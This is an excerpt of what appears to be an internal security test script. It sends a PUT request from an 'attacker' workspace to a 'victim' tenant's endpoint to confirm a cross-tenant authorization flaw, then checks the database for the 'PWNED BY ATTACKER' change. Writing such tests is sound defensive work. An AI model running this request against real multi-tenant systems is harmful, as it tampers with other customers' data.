...
async function run() {
  ...
  const attackerWorkspace = await prisma.workspace.findFirst({
    where: { name: "SEC_TEST_ATTACKER_WS" },
  });
  const victimTenant = await prisma.tenant.findFirst({
    where: { name: "Victim Tenant" },
  });
  ...
  const response = await fetch(
    `${baseUrl}/api/workspaces/${attackerWorkspace.id}/tenants/${victimTenant.id}`,
    {
      method: "PUT",
      headers: {
  ...
  if (response.status === 200) {
    console.log(
      "✅ VULNERABILITY CONFIRMED: Tenant update successful across workspace boundaries!",
    );
    console.log("Response:", JSON.stringify(result, null, 2));

    // Verify in DB
    const updatedTenant = await prisma.tenant.findUnique({
      where: { id: victimTenant.id },
    });
    if (updatedTenant?.name === "PWNED BY ATTACKER") {
      console.log("📊 DATABASE VERIFICATION: Data was actually modified.");
    } else {
      console.log(
        "❌ Database verification failed. Maybe the update didn't stick?",
      );
    }
  } else {
    console.log(
      `❌ VULNERABILITY NOT EXPLOITED: Server returned status ${response.status}`,
    );
    console.log("Response:", JSON.stringify(result, null, 2));
  }
